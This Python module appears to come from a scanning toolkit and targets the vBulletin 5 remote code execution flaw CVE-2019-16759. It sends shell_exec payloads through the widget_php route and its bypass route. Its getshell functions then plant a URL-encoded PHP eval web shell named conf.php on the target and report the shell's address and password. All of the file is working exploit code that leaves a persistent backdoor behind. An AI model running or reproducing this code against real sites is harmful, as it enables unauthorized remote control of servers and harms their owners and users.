#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2019_16759:
    def checkVbulletin5Rce(self,tgtUrl, timeout):
        try:
            params = {"routestring": "ajax/render/widget_php"}
            params1 = {"subWidgets[0][template]": "widget_php"}
            cmd = 'echo fe0a612646c36e7f89b5b81f8f141d3d'  # md5(check-vbulletin5-rce)

            params["widgetConfig[code]"] = "echo shell_exec('" + cmd + "'); exit;"

            rsp = requests.post(tgtUrl, headers=self.headers,proxies=self.proxy,verify=self.ssl, data=params, timeout=timeout)

            # print rsp.text.encode('utf-8')

            if rsp.status_code == 200 and ("fe0a612646c36e7f89b5b81f8f141d3d" in rsp.text):
                OutPrintInfoSuc("vBulletin", f'目标存在CVE-2019-16759-RCE漏洞: {tgtUrl}')
                if self.batch:
                    OutPutFile("vBulletin_2029_16759.txt",f'目标存在CVE-2019-16759-RCE漏洞: {tgtUrl}')
                return True
                # print 'Target is vulnerable!!!' + '\n'
            else:
                tgtUrl = tgtUrl + "/ajax/render/widget_tabbedcontainer_tab_panel"
                params1["subWidgets[0][config][code]"] = "echo shell_exec('" + cmd + "'); exit;"
                rsp2 = requests.post(tgtUrl, headers=self.headers,proxies=self.proxy,verify=self.ssl, data=params1, timeout=timeout)
                if rsp2.status_code == 200 and ("fe0a612646c36e7f89b5b81f8f141d3d" in rsp2.text):
                    OutPrintInfoSuc("vBulletin", f'Bypassing CVE-2019-16759-RCE漏洞成功: {tgtUrl}')
                    if self.batch:
                        OutPutFile("vBulletin_2029_16759.txt", f'目标存在CVE-2019-16759-RCE漏洞: {tgtUrl}')
                    return True
                else:
                    return False
                # print 'Target is not vulnerable.' + '\n'
        except Exception:
            if not self.batch:
                OutPrintInfo("vBulletin",'目标请求出错')

    def vbulletin5RceGetshell(self,tgtUrl, timeout):
        getshellSuccess = 0
        params = {"routestring": "ajax/render/widget_php"}
        exp = 'file_put_contents(\'conf.php\',urldecode(\'%3c%3fphp%20@eval(%24_%50%4f%53%54%5b%22x%22%5d)%3b%3f%3e\')); exit;'
        # cmd = 'echo '
        # params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"
        params["widgetConfig[code]"] = exp
        try:
            rsp = requests.post(tgtUrl, headers=self.headers,proxies=self.proxy,verify=self.ssl, data=params, timeout=timeout)

            if rsp.status_code == 200:
                rsp1 = requests.get(tgtUrl + '/conf.php', verify=False, timeout=timeout)
                if rsp1.status_code == 200:
                    getshellSuccess = 1
                    OutPrintInfoSuc("vBulletin",f'Getshell successed!!!Shell addr: {tgtUrl}/conf.php:x')

                else:
                    OutPrintInfoSuc("vBulletin",'Getshell failed.')
            else:
                OutPrintInfoSuc("vBulletin",'rsp something error.')

            if getshellSuccess == 0:
                OutPrintInfoSuc("vBulletin",'Bypassing CVE-2019-16759......')
                self.vbulletin5RceGetshellBypass(tgtUrl, timeout)
        except Exception:
            OutPrintInfo("vBulletin", '目标请求出错')

    def vbulletin5RceGetshellBypass(self,tgtUrl, timeout):
        tgtUrl1 = tgtUrl + "/ajax/render/widget_tabbedcontainer_tab_panel"
        exp = 'file_put_contents(\'conf.php\',urldecode(\'%3c%3fphp%20@eval(%24_%50%4f%53%54%5b%22x%22%5d)%3b%3f%3e\')); exit;'
        params1 = {"subWidgets[0][template]": "widget_php"}
        params1["subWidgets[0][config][code]"] = exp
        try:
            rsp3 = requests.post(tgtUrl1, headers=self.headers,proxies=self.proxy,verify=self.ssl, data=params1, timeout=timeout)

            if rsp3.status_code == 200:
                rsp4 = requests.get(tgtUrl + '/conf.php', verify=False, timeout=timeout)
                if rsp4.status_code == 200:
                    OutPrintInfoSuc("vBulletin",f'Getshell successed!!!(Bypassing CVE-2019-16759)Shell addr: {tgtUrl}/conf.php:x')

                else:
                    OutPrintInfoSuc("vBulletin",'Getshell failed(Bypassing CVE-2019-16759).')
            else:
                OutPrintInfoSuc("vBulletin",'rsp3 (Bypassing CVE-2019-16759) something error.')
        except Exception:
            OutPrintInfo("vBulletin", '目标请求出错')

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        timeout = int(target["timeout"])
        # self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("vBulletin", '开始检测CVE-2019-16759-RCE漏洞...')
        if self.checkVbulletin5Rce(url,timeout):
            if not self.batch:
                self.vbulletin5RceGetshell(url,timeout)
        # self.get_url(url)
        if not self.batch:
            OutPrintInfo("vBulletin", 'CVE-2019-16759-RCE漏洞检测结束')



